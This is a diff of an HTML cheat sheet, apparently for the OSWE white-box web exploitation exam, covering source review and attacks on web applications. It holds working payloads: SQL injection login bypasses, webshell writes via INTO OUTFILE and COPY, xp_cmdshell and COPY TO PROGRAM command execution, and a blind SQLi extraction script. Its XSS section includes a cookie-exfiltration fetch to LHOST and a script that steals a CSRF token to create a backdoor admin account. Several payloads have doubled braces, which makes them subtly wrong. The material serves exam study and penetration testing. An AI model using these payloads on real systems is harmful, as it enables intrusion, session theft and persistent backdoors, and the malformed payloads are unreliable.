@@ -173,35 +173,1366 @@
         <div class="row gy-4">
           <div class="col-lg-12">
             <div class="cheatsheet-content">
-<h2 id="oswe-tools-setup">1. Tools &amp; Setup</h2>
-              <ul>
-                <li>White-box exam &mdash; you receive the application source code and must produce a working automated exploit</li>
-                <li>Toolchain: Burp Suite Pro for traffic inspection, Python for scripted exploitation, per-language IDE/debugger, decompilers for closed binaries</li>
-              </ul>
-              <h3 id="oswe-lab-setup">1.1 Lab Environment</h3>
-              <ul>
-                <li>One project folder per target with source tree, exploit script, captured Burp requests, and notes</li>
-                <li>Use <code>requests.Session()</code> so cookies and tokens propagate automatically</li>
-                <li>Disable TLS verification (<code>s.verify = False</code>) &mdash; exam labs use self-signed certs</li>
-              </ul>
-              <table class="custom-table">
-                <thead><tr><th>Tool</th><th>Use Case</th></tr></thead>
-                <tbody>
-                  <tr><td>Burp Suite Pro</td><td>Intercept, repeat, intruder fuzzing, sequencer, comparer, decoder</td></tr>
-                  <tr><td>Python requests + BeautifulSoup</td><td>End-to-end automation of the exploit chain</td></tr>
-                  <tr><td>Xdebug (PHP)</td><td>Step-debug PHP source; observe sink values live in VS Code</td></tr>
-                  <tr><td>node --inspect / ndb</td><td>Debug Node.js apps; trace prototype chains and event handlers</td></tr>
-                  <tr><td>jdb / IntelliJ Remote Debug</td><td>Debug Java web apps (Tomcat, SpringBoot, Frappe)</td></tr>
-                  <tr><td>dnSpy / ILSpy</td><td>Decompile and debug .NET assemblies (DotNetNuke-style targets)</td></tr>
-                  <tr><td>jd-gui / CFR / Procyon</td><td>Decompile Java JARs / WARs / classes</td></tr>
-                  <tr><td>ysoserial / ysoserial.net / PHPGGC</td><td>Generate deserialization gadget-chain payloads</td></tr>
-                  <tr><td>Semgrep / CodeQL</td><td>Automated taint tracking from source to sink</td></tr>
-                  <tr><td>tplmap</td><td>Detect and exploit SSTI in multiple engines</td></tr>
-                  <tr><td>jwt_tool</td><td>Decode, sign, forge, bruteforce JWT tokens</td></tr>
-                  <tr><td>sqlmap</td><td>Confirm SQLi, enumerate, dump, try --os-shell</td></tr>
-                </tbody>
-              </table>
-              <h3 id="oswe-script-skeleton">1.2 Exploit Script Skeleton</h3>
+<h2 id="methodology">1. Methodology</h2>
+<ul><li>Operator-checklist methodology for white-box web application testing. Each phase walks a vulnerability class end-to-end: identify the sink, trace the taint, confirm exploitability, chain to RCE or account takeover, write the exploit script.</li></ul>
+
+<h3 id="methodology-source-review">1.1 Source Code Review</h3>
+<ul><li>Map the application before hunting bugs. Understand routes, sinks, and data flow first &mdash; the rest of the methodology depends on this phase.</li></ul>
+<h3 id="methodology-source-review-route-mapping">1.1.1 Route &amp; Endpoint Mapping</h3>
+  <ul>
+    <li>Enumerate every route the application exposes:
+      <ul>
+        <li>Flask / Django: <code>grep -rn "@app.route\|@blueprint.route\|path(" src/</code></li>
+        <li>Express: <code>grep -rn "app.get\|app.post\|app.put\|app.delete\|router." src/</code></li>
+        <li>Spring: <code>grep -rn "@RequestMapping\|@GetMapping\|@PostMapping" src/</code></li>
+        <li>PHP: <code>grep -rn "\$_GET\|\$_POST\|\$_REQUEST\|Route::" src/</code></li>
+        <li>.NET: <code>grep -rn "\[HttpGet\|\[HttpPost\|\[Route" src/</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Route enumeration — run all greps and collate into a route map
+grep -rn "@app.route\|@blueprint.route" src/        # Flask / Django
+grep -rn "app.get\|app.post\|router\." src/          # Express
+grep -rn "@RequestMapping\|@GetMapping\|@PostMapping" src/  # Spring
+grep -rn "\$_GET\|\$_POST\|\$_REQUEST" src/          # PHP
+grep -rn "\[HttpGet\]\|\[HttpPost\]\|\[Route" src/  # .NET</code></pre>
+  <ul>
+    <li>Identify pre-auth vs post-auth endpoints:
+      <ul>
+        <li>Check for middleware / decorators that enforce authentication</li>
+        <li>Map which routes skip auth checks &mdash; these are the primary targets</li>
+        <li>Note any role-based access control (RBAC) decorators</li>
+      </ul>
+    </li>
+    <li>Document the API surface:
+      <ul>
+        <li>REST endpoints with methods and parameters</li>
+        <li>GraphQL schemas if present</li>
+        <li>WebSocket handlers</li>
+        <li>File upload endpoints</li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-source-review-sink-identification">1.1.2 Dangerous Sink Identification</h3>
+  <ul>
+    <li>Grep for OS command execution sinks:
+      <ul>
+        <li>PHP: <code>grep -rn "eval\|system\|exec\|passthru\|shell_exec\|popen\|proc_open" src/</code></li>
+        <li>Python: <code>grep -rn "os\.system\|subprocess\|eval\|exec\|render_template_string" src/</code></li>
+        <li>Java: <code>grep -rn "Runtime\.exec\|ProcessBuilder\|ScriptEngine\|EL.*Expression" src/</code></li>
+        <li>Node.js: <code>grep -rn "eval\|exec\|execSync\|spawn\|Function(" src/</code></li>
+      </ul>
+    </li>
+    <li>Grep for deserialization sinks:
+      <ul>
+        <li>.NET: <code>grep -rn "BinaryFormatter\|NetDataContract\|SoapFormatter\|LosFormatter\|XmlSerializer" src/</code></li>
+        <li>Java: <code>grep -rn "readObject\|XMLDecoder\|fromXML\|ObjectInputStream" src/</code></li>
+        <li>PHP: <code>grep -rn "unserialize\s*(" src/</code></li>
+        <li>Node.js: <code>grep -rn "node-serialize\|js-yaml\.load" src/</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Dangerous sink grep — OS command execution
+grep -rn "eval\|system\|exec\|passthru\|shell_exec\|popen\|proc_open" src/     # PHP
+grep -rn "os\.system\|subprocess\|eval\|exec\|render_template_string" src/      # Python
+grep -rn "Runtime\.exec\|ProcessBuilder\|ScriptEngine" src/                     # Java
+grep -rn "eval\|exec\|execSync\|spawn\|Function(" src/                          # Node.js
+
+# Dangerous sink grep — deserialization
+grep -rn "BinaryFormatter\|NetDataContract\|SoapFormatter\|LosFormatter" src/   # .NET
+grep -rn "readObject\|XMLDecoder\|ObjectInputStream" src/                       # Java
+grep -rn "unserialize\s*(" src/                                                 # PHP</code></pre>
+  <ul>
+    <li>Grep for SQL query construction:
+      <ul>
+        <li>String concatenation in queries: <code>grep -rn "SELECT.*+\|INSERT.*+\|UPDATE.*+\|DELETE.*+" src/</code></li>
+        <li>Parameterized queries are safe &mdash; focus on raw string concatenation</li>
+        <li>ORM raw methods: <code>grep -rn "raw\|execute\|rawQuery\|createNativeQuery" src/</code></li>
+      </ul>
+    </li>
+    <li>Run automated static analysis:
+      <ul>
+        <li>Semgrep: <code>semgrep --config p/php-security src/</code> (also <code>p/java-security</code>, <code>p/nodejs-security</code>)</li>
+        <li>CodeQL if the codebase is large enough to warrant it</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Automated static analysis with Semgrep
+semgrep --config p/php-security src/
+semgrep --config p/java-security src/
+semgrep --config p/nodejs-security src/
+semgrep --config p/python-security src/</code></pre>
+<p><strong>References:</strong> <a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener noreferrer">OWASP Top 10</a> &middot; <a href="https://cwe.mitre.org/" target="_blank" rel="noopener noreferrer">MITRE CWE</a></p>
+
+<h3 id="methodology-source-review-taint-tracing">1.1.3 Taint Tracing</h3>
+  <ul>
+    <li>For each dangerous sink found, trace backward to the input source:
+      <ul>
+        <li>Identify where user input enters: query params, POST body, headers, cookies, file uploads</li>
+        <li>Follow the variable through every function call, assignment, and transformation</li>
+        <li>Note any sanitisation or validation along the path</li>
+      </ul>
+    </li>
+    <li>Determine if sanitisation is bypassable:
+      <ul>
+        <li>Blacklist-based filtering &mdash; look for bypass payloads</li>
+        <li>Encoding/decoding mismatches (double encoding, charset tricks)</li>
+        <li>Type confusion or casting issues</li>
+        <li>Race conditions in check-then-use patterns</li>
+      </ul>
+    </li>
+    <li>Confirm reachability without authentication where possible:
+      <ul>
+        <li>Pre-auth sinks are highest value</li>
+        <li>Post-auth sinks still matter for privilege escalation chains</li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-source-review-debugger-setup">1.1.4 Debugger Setup</h3>
+  <ul>
+    <li>PHP &mdash; Xdebug + VS Code:
+      <ul>
+        <li>Install: <code>pecl install xdebug</code> or <code>apt install php-xdebug</code></li>
+        <li>Config: <code>xdebug.mode=debug</code>, <code>xdebug.start_with_request=yes</code>, <code>xdebug.client_host=host.docker.internal</code></li>
+        <li>VS Code: install PHP Debug extension, set breakpoints, launch listener on port 9003</li>
+      </ul>
+    </li>
+    <li>Node.js &mdash; Inspector protocol:
+      <ul>
+        <li><code>node --inspect-brk=0.0.0.0:9229 app.js</code></li>
+        <li>Chrome DevTools: <code>chrome://inspect</code> &rarr; configure target &rarr; attach</li>
+        <li>VS Code: attach to running process via launch.json</li>
+      </ul>
+    </li>
+    <li>Java &mdash; JDWP remote debug:
+      <ul>
+        <li><code>JAVA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005"</code></li>
+        <li>IntelliJ / VS Code: remote debug configuration targeting port 5005</li>
+      </ul>
+    </li>
+    <li>Python &mdash; debugpy:
+      <ul>
+        <li><code>python3 -m debugpy --listen 0.0.0.0:5678 --wait-for-client app.py</code></li>
+        <li>VS Code: Python attach configuration targeting port 5678</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># PHP — Xdebug config (add to php.ini or xdebug.ini)
+xdebug.mode=debug
+xdebug.start_with_request=yes
+xdebug.client_host=host.docker.internal
+xdebug.client_port=9003
+
+# Node.js — start with inspector
+node --inspect-brk=0.0.0.0:9229 app.js
+
+# Java — JDWP remote debug (add to JAVA_OPTS)
+JAVA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005"
+
+# Python — debugpy
+python3 -m debugpy --listen 0.0.0.0:5678 --wait-for-client app.py</code></pre>
+
+<p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/pentesting-web" target="_blank" rel="noopener noreferrer">HackTricks Web</a> &middot; <a href="https://cheatsheetseries.owasp.org/" target="_blank" rel="noopener noreferrer">OWASP Cheat Sheet Series</a></p>
+
+<h3 id="methodology-auth-bypass">1.2 Authentication Bypass</h3>
+<ul><li>Test every authentication mechanism for logic flaws before moving to injection-based attacks.</li></ul>
+<h3 id="methodology-auth-bypass-sqli-auth">1.2.1 SQL Injection Auth Bypass</h3>
+  <ul>
+    <li>Test the login form with classic SQLi payloads:
+      <ul>
+        <li>Username field: <code>admin'--</code>, <code>admin'#</code>, <code>' OR '1'='1</code></li>
+        <li>Password field: <code>' OR 1=1--</code>, <code>' OR 1=1#</code></li>
+        <li>Both fields: <code>admin' AND 1=1--</code> (confirm boolean blind)</li>
+      </ul>
+    </li>
+    <li>Test for second-order SQLi in registration / profile update:
+      <ul>
+        <li>Register with a username containing SQL metacharacters</li>
+        <li>Trigger the injection when the stored value is used in a later query</li>
+      </ul>
+    </li>
+    <li>Check for NoSQL injection on MongoDB backends:
+      <ul>
+        <li>JSON body: <code>{{"user": {{"$ne": ""}}, "pass": {{"$ne": ""}}}}</code></li>
+        <li>Query string: <code>user[$ne]=&pass[$ne]=</code></li>
+      </ul>
+    </li>
+  </ul>
+<p><strong>References:</strong> <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener noreferrer">PortSwigger SQLi</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings SQLi</a></p>
+
+<h3 id="methodology-auth-bypass-type-juggling">1.2.2 Type Juggling &amp; Magic Hashes</h3>
+  <ul>
+    <li>Test PHP loose comparison (==) bypasses:
+      <ul>
+        <li>Send integer <code>0</code> where string is expected: <code>0 == "admin"</code> evaluates to TRUE in PHP</li>
+        <li>JSON content type allows type control: <code>{{"user": 0, "pass": "anything"}}</code></li>
+      </ul>
+    </li>
+    <li>Test magic hash collisions:
+      <ul>
+        <li>MD5 of <code>240610708</code> = <code>0e462097431906509019562988736854</code> &mdash; evaluates to 0 in loose comparison</li>
+        <li>SHA1 of <code>10932435112</code> = <code>0e07766915004133176347055865026311692244</code></li>
+        <li>If the app compares hashes with <code>==</code> instead of <code>===</code>, supply a magic-hash input</li>
+      </ul>
+    </li>
+    <li>Test array parameter injection:
+      <ul>
+        <li>Send <code>pass[]=&pass[]=</code> to make <code>strcmp()</code> return NULL (treated as 0 / equal)</li>
+        <li>Works when backend uses <code>strcmp()</code> or <code>strcasecmp()</code> without strict type checks</li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-auth-bypass-jwt-attacks">1.2.3 JWT Attacks</h3>
+  <ul>
+    <li>Decode and inspect the JWT structure:
+      <ul>
+        <li><code>jwt_tool "eyJ..." -d</code> &mdash; decode header, payload, signature</li>
+        <li>Check <code>alg</code> field: RS256, HS256, none</li>
+        <li>Check claims: <code>sub</code>, <code>role</code>, <code>exp</code>, <code>iss</code></li>
+      </ul>
+    </li>
+    <li>Test algorithm confusion (RS256 &rarr; HS256):
+      <ul>
+        <li><code>jwt_tool "eyJ..." -X a -pk public.pem</code> &mdash; sign with public key as HMAC secret</li>
+        <li>Requires the server&rsquo;s public key (often in <code>/.well-known/jwks.json</code>)</li>
+      </ul>
+    </li>
+    <li>Test none algorithm:
+      <ul>
+        <li><code>jwt_tool "eyJ..." -X n</code> &mdash; strip signature, set alg to none</li>
+      </ul>
+    </li>
+    <li>Brute-force weak HMAC secrets:
+      <ul>
+        <li><code>jwt_tool "eyJ..." -C -d /usr/share/wordlists/rockyou.txt</code></li>
+        <li>If cracked, forge tokens with arbitrary claims</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># JWT attack commands
+jwt_tool "eyJ..." -d                                    # Decode header + payload + signature
+jwt_tool "eyJ..." -X a -pk public.pem                   # Algorithm confusion (RS256 → HS256)
+jwt_tool "eyJ..." -X n                                  # None algorithm — strip signature
+jwt_tool "eyJ..." -C -d /usr/share/wordlists/rockyou.txt  # Brute-force HMAC secret
+jwt_tool "eyJ..." -T                                    # Interactive tamper mode</code></pre>
+  <ul>
+    <li>Tamper claims and re-sign:
+      <ul>
+        <li><code>jwt_tool "eyJ..." -T</code> &mdash; interactive tamper mode</li>
+        <li>Change <code>sub</code> to admin, change <code>role</code> to administrator</li>
+        <li>Change <code>exp</code> to a future timestamp for expired-token bypass</li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-auth-bypass-password-reset">1.2.4 Password Reset Flaws</h3>
+  <ul>
+    <li>Test for predictable reset tokens:
+      <ul>
+        <li>Request multiple resets, compare tokens for sequential / timestamp-based patterns</li>
+        <li>Brute-force short tokens if the keyspace is small</li>
+      </ul>
+    </li>
+    <li>Test Host header injection:
+      <ul>
+        <li>Set <code>Host: evil.com</code> in the reset request</li>
+        <li>If the reset email contains <code>Host</code>-derived URL, token leaks to attacker</li>
+        <li>Also try <code>X-Forwarded-Host: evil.com</code> and <code>X-Original-URL</code></li>
+      </ul>
+    </li>
+    <li>Test parameter pollution:
+      <ul>
+        <li>Add duplicate email: <code>email=victim@x.com&email=attacker@x.com</code></li>
+        <li>Some frameworks use the last value; the reset token may be sent to both</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener noreferrer">PortSwigger SQLi</a> &middot; <a href="https://book.hacktricks.xyz/pentesting-web" target="_blank" rel="noopener noreferrer">HackTricks Web</a></p>
+
+<h3 id="methodology-sqli-rce">1.3 SQL Injection to RCE</h3>
+<ul><li>Once SQLi is confirmed, escalate from data extraction to OS-level code execution.</li></ul>
+<h3 id="methodology-sqli-rce-db-fingerprint">1.3.1 Database Fingerprinting</h3>
+  <ul>
+    <li>Identify the database engine:
+      <ul>
+        <li>MySQL / MSSQL: <code>SELECT @@version</code></li>
+        <li>PostgreSQL: <code>SELECT version()</code></li>
+        <li>Oracle: <code>SELECT banner FROM v$version</code></li>
+        <li>SQLite: <code>SELECT sqlite_version()</code></li>
+      </ul>
+    </li>
+    <li>Error-based fingerprinting when output is hidden:
+      <ul>
+        <li>MySQL: <code>extractvalue(1, concat(0x7e, version()))</code></li>
+        <li>MSSQL: <code>CONVERT(int, @@version)</code> triggers type conversion error with version string</li>
+        <li>PostgreSQL: <code>CAST(version() AS int)</code></li>
+      </ul>
+    </li>
+    <li>Enumerate databases, tables, columns:
+      <ul>
+        <li>MySQL: <code>SELECT schema_name FROM information_schema.schemata</code></li>
+        <li>Tables: <code>SELECT table_name FROM information_schema.tables WHERE table_schema='target'</code></li>
+        <li>Columns: <code>SELECT column_name FROM information_schema.columns WHERE table_name='users'</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-sqli-rce-file-write">1.3.2 File Write to Webshell</h3>
+  <ul>
+    <li>MySQL file write (requires FILE privilege):
+      <ul>
+        <li><code>SELECT '&lt;?php system($_GET["c"]);?&gt;' INTO OUTFILE '/var/www/html/shell.php'</code></li>
+        <li>Check privilege: <code>SELECT file_priv FROM mysql.user WHERE user=current_user()</code></li>
+        <li>Check <code>secure_file_priv</code> variable &mdash; must be empty or writable web path</li>
+      </ul>
+    </li>
+    <li>PostgreSQL file write via COPY:
+      <ul>
+        <li><code>COPY (SELECT '&lt;?php system($_GET["c"]);?&gt;') TO '/var/www/html/shell.php'</code></li>
+        <li>Requires superuser or <code>pg_write_server_files</code> role</li>
+      </ul>
+    </li>
+    <li>PostgreSQL large objects for binary file writes:
+      <ul>
+        <li><code>SELECT lo_from_bytea(0, '\\x3c3f706870...')</code> &mdash; create large object from hex payload</li>
+        <li><code>SELECT lo_export(OID, '/var/www/html/shell.php')</code> &mdash; export to filesystem</li>
+        <li>Clean up: <code>SELECT lo_unlink(OID)</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># MySQL — write webshell (requires FILE privilege + empty secure_file_priv)
+SELECT '&lt;?php system($_GET["c"]);?&gt;' INTO OUTFILE '/var/www/html/shell.php';
+
+# PostgreSQL — COPY to write a file
+COPY (SELECT '&lt;?php system($_GET["c"]);?&gt;') TO '/var/www/html/shell.php';
+
+# PostgreSQL — large objects for binary writes
+SELECT lo_from_bytea(0, '\x3c3f706870...');     -- create LO from hex-encoded payload
+SELECT lo_export(12345, '/var/www/html/s.php');  -- export LO to disk (use returned OID)
+SELECT lo_unlink(12345);                        -- clean up</code></pre>
+  <ul>
+    <li>Confirm the webshell works:
+      <ul>
+        <li><code>curl http://target/shell.php?c=id</code> &mdash; verify command execution</li>
+        <li>Upgrade to a reverse shell immediately and remove the webshell</li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-sqli-rce-os-command">1.3.3 OS Command Execution</h3>
+  <ul>
+    <li>MSSQL xp_cmdshell:
+      <ul>
+        <li>Enable: <code>EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;</code></li>
+        <li>Execute: <code>EXEC xp_cmdshell 'whoami'</code></li>
+        <li>Reverse shell: <code>EXEC xp_cmdshell 'powershell -enc [base64]'</code></li>
+      </ul>
+    </li>
+    <li>PostgreSQL COPY TO PROGRAM:
+      <ul>
+        <li><code>COPY (SELECT '') TO PROGRAM 'id'</code></li>
+        <li>Requires superuser; available in PostgreSQL 9.3+</li>
+      </ul>
+    </li>
+    <li>PostgreSQL UDF for persistent RCE:
+      <ul>
+        <li>Compile: <code>gcc -I\"$(pg_config --includedir-server)\" -fPIC -shared rce_ext.c -o rce_ext.so</code></li>
+        <li><code>CREATE FUNCTION rce(text) RETURNS void AS '/tmp/rce_ext.so', 'rce' LANGUAGE C STRICT;</code></li>
+        <li><code>SELECT rce('id')</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># MSSQL — enable and use xp_cmdshell
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+
+# PostgreSQL — COPY TO PROGRAM (9.3+, requires superuser)
+COPY (SELECT '') TO PROGRAM 'id';
+
+# PostgreSQL — UDF for persistent RCE
+gcc -I"$(pg_config --includedir-server)" -fPIC -shared rce_ext.c -o rce_ext.so
+# Then in SQL:
+CREATE FUNCTION rce(text) RETURNS void AS '/tmp/rce_ext.so', 'rce' LANGUAGE C STRICT;
+SELECT rce('id');</code></pre>
+
+<h3 id="methodology-sqli-rce-blind-extraction">1.3.4 Blind Data Extraction</h3>
+  <ul>
+    <li>Time-based blind injection:
+      <ul>
+        <li>MySQL: <code>IF(SUBSTRING(user(),1,1)='r', SLEEP(2), 0)</code></li>
+        <li>PostgreSQL: <code>SELECT CASE WHEN (SUBSTRING(current_user,1,1)='p') THEN pg_sleep(2) ELSE pg_sleep(0) END</code></li>
+        <li>MSSQL: <code>IF (SUBSTRING(system_user,1,1)='s') WAITFOR DELAY '0:0:2'</code></li>
+      </ul>
+    </li>
+    <li>Boolean-based blind injection:
+      <ul>
+        <li>Compare response length / content for TRUE vs FALSE conditions</li>
+        <li>MySQL: <code>AND SUBSTRING(user(),1,1)='r'</code></li>
+        <li>Automate with binary search over ASCII values</li>
+      </ul>
+    </li>
+    <li>Script the extraction in Python:
+      <ul>
+        <li>Use <code>requests.Session()</code> with a timing loop</li>
+        <li>Extract one character at a time, measure response time</li>
+        <li>Build the full string character by character</li>
+        <li>Consider <code>sqlmap -u "http://target/?id=1" --os-shell</code> for automation</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-python">import requests, time, string
+
+s = requests.Session()
+s.verify = False
+extracted = ""
+
+for pos in range(1, 50):
+    for c in string.printable:
+        # Time-based blind — MySQL example
+        payload = f"' AND IF(SUBSTRING(user(),{pos},1)='{c}', SLEEP(2), 0)-- -"
+        start = time.time()
+        s.get(f"http://target/page?id=1{payload}")
+        if time.time() - start > 2:
+            extracted += c
+            print(f"[+] {extracted}")
+            break
+    else:
+        break  # no char matched — end of string
+
+print(f"[*] Extracted: {extracted}")</code></pre>
+
+<p><strong>General references:</strong> <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener noreferrer">PortSwigger SQLi</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings SQLi</a> &middot; <a href="https://book.hacktricks.xyz/pentesting-web" target="_blank" rel="noopener noreferrer">HackTricks Web</a></p>
+
+<h3 id="methodology-xss">1.4 Cross-Site Scripting to Account Takeover</h3>
+<ul><li>Find a reflection or stored injection point, escalate to session hijacking or admin-action forgery.</li></ul>
+<h3 id="methodology-xss-reflection">1.4.1 Reflection Discovery</h3>
+  <ul>
+    <li>Inject a unique canary string in every input:
+      <ul>
+        <li><code>curl -s "http://target/search?q=xsscanary123" | grep xsscanary123</code></li>
+        <li>Check query parameters, POST body fields, headers (Referer, User-Agent), URL path segments</li>
+        <li>Note the context: inside HTML tag, inside attribute, inside <code>&lt;script&gt;</code> block, inside comment</li>
+      </ul>
+    </li>
+    <li>Determine the rendering context:
+      <ul>
+        <li>HTML context: inject <code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+        <li>Attribute context: break out with <code>" onmouseover="alert(1)</code></li>
+        <li>JavaScript context: break string with <code>';alert(1)//</code></li>
+        <li>URL context: <code>javascript:alert(1)</code></li>
+      </ul>
+    </li>
+    <li>Check for DOM-based XSS separately:
+      <ul>
+        <li>Dangerous sinks: <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>setTimeout</code></li>
+        <li>Sources: <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>window.name</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-xss-payload-crafting">1.4.2 Payload Crafting</h3>
+  <ul>
+    <li>Start with a polyglot that works in multiple contexts:
+      <ul>
+        <li><code>jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//</code></li>
+      </ul>
+    </li>
+    <li>Try alternate event handlers if common ones are filtered:
+      <ul>
+        <li><code>&lt;svg/onload=alert(1)&gt;</code></li>
+        <li><code>&lt;details open ontoggle=alert(1)&gt;</code></li>
+        <li><code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+        <li><code>&lt;body onresize=alert(1)&gt;</code></li>
+      </ul>
+    </li>
+    <li>Bypass filters with encoding:
+      <ul>
+        <li>HTML entities: <code>&amp;lt;img src=x onerror=alert(1)&amp;gt;</code></li>
+        <li>JavaScript hex: <code>\\x3cscript\\x3ealert(1)\\x3c/script\\x3e</code></li>
+        <li>Template literals: <code>${{alert(1)}}</code></li>
+        <li>Unicode escapes: <code>\\u0061lert(1)</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-xss-session-theft">1.4.3 Cookie &amp; Session Theft</h3>
+  <ul>
+    <li>Exfiltrate cookies via fetch:
+      <ul>
+        <li><code>&lt;script&gt;fetch("http://LHOST/x?c="+document.cookie)&lt;/script&gt;</code></li>
+        <li>Start a listener: <code>python3 -m http.server 80</code> and watch for the cookie in the request</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-javascript">// Cookie exfiltration payload
+&lt;script&gt;fetch("http://LHOST/x?c="+document.cookie)&lt;/script&gt;
+
+// CSRF token steal + admin action chain
+&lt;script&gt;
+fetch("/admin/settings", {credentials:"include"})
+  .then(r =&gt; r.text())
+  .then(html =&gt; {
+    let csrf = html.match(/name="csrf_token" value="([^"]+)"/)[1];
+    fetch("/admin/create-user", {
+      method: "POST",
+      credentials: "include",
+      headers: {"Content-Type": "application/x-www-form-urlencoded"},
+      body: "username=backdoor&amp;password=P@ss123&amp;role=admin&amp;csrf_token=" + csrf
+    });
+  });
+&lt;/script&gt;</code></pre>
+  <ul>
+    <li>Steal CSRF tokens for chained attacks:
+      <ul>
+        <li>Fetch the admin page: <code>fetch("/admin/settings", {{credentials:"include"}})</code></li>
+        <li>Parse the CSRF token from the response HTML</li>
+        <li>POST the privileged action with the stolen token</li>
+      </ul>
+    </li>
+    <li>Check cookie security flags:
+      <ul>
+        <li><code>HttpOnly</code> prevents JavaScript access &mdash; pivot to CSRF-based attacks instead</li>
+        <li><code>Secure</code> limits to HTTPS &mdash; ensure exfil URL uses HTTPS</li>
+        <li><code>SameSite</code> may block cross-origin requests</li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-xss-admin-actions">1.4.4 XSS to Admin Actions</h3>
+  <ul>
+    <li>Create a backdoor admin account via stored XSS:
+      <ul>
+        <li>Inject payload that fetches the admin user-creation form</li>
+        <li>Parse the CSRF token, POST a new admin user with attacker-controlled credentials</li>
+        <li>Wrap in an IIFE so the payload fires once per victim visit</li>
+      </ul>
+    </li>
+    <li>Exfiltrate sensitive data:
+      <ul>
+        <li>Fetch <code>/admin/users</code>, <code>/api/config</code>, database connection strings</li>
+        <li>Send results to <code>http://LHOST/exfil</code> via <code>fetch()</code></li>
+      </ul>
+    </li>
+    <li>Establish persistence:
+      <ul>
+        <li>IndexedDB storage for persistent loot collection across sessions</li>
+        <li>WebSocket channel for real-time interaction with the victim browser</li>
+        <li>Service Worker registration for persistent code execution</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener noreferrer">PortSwigger XSS</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings XSS</a></p>
+
+<h3 id="methodology-ssti">1.5 Server-Side Template Injection</h3>
+<ul><li>Detect the template engine, then escalate from expression evaluation to OS command execution.</li></ul>
+<h3 id="methodology-ssti-detection">1.5.1 Template Engine Detection</h3>
+  <ul>
+    <li>Inject arithmetic probes to confirm template evaluation:
+      <ul>
+        <li><code>{{{{7*7}}}}</code> &mdash; Jinja2, Twig, Handlebars (returns 49)</li>
+        <li><code>${{7*7}}</code> &mdash; Freemarker, Thymeleaf, EL (returns 49)</li>
+        <li><code>#{{7*7}}</code> &mdash; Thymeleaf, Pebble (returns 49)</li>
+        <li><code>*{{7*7}}</code> &mdash; some EL implementations</li>
+        <li><code>&lt;%= 7*7 %&gt;</code> &mdash; ERB, EJS (returns 49)</li>
+      </ul>
+    </li>
+    <li>Distinguish between engines with type-sensitive probes:
+      <ul>
+        <li><code>{{{{7*'7'}}}}</code> &mdash; Jinja2 returns <code>7777777</code>, Twig returns <code>49</code></li>
+        <li><code>{{{{"foo".__class__}}}}</code> &mdash; Jinja2 returns <code>&lt;class 'str'&gt;</code>, others error</li>
+      </ul>
+    </li>
+  </ul>
+<h3>SSTI Engine Detection Matrix</h3>
+<table class="custom-table">
+  <thead>
+    <tr><th>Probe</th><th>Jinja2</th><th>Twig</th><th>Freemarker</th><th>ERB</th><th>EJS</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><code>{{7*7}}</code></td><td>49</td><td>49</td><td>Error</td><td>Literal</td><td>Literal</td></tr>
+    <tr><td><code>${7*7}</code></td><td>Literal</td><td>Literal</td><td>49</td><td>Literal</td><td>Literal</td></tr>
+    <tr><td><code>&lt;%= 7*7 %&gt;</code></td><td>Literal</td><td>Literal</td><td>Literal</td><td>49</td><td>49</td></tr>
+    <tr><td><code>{{7*'7'}}</code></td><td>7777777</td><td>49</td><td>Error</td><td>Literal</td><td>Literal</td></tr>
+    <tr><td><code>{{"foo".__class__}}</code></td><td>&lt;class 'str'&gt;</td><td>Error</td><td>Error</td><td>Error</td><td>Error</td></tr>
+  </tbody>
+</table>
+  <ul>
+    <li>Check for blind SSTI:
+      <ul>
+        <li>No output reflected? Try time-based: template that triggers a delay</li>
+        <li>Or OOB: template that makes a DNS/HTTP callback to your server</li>
+      </ul>
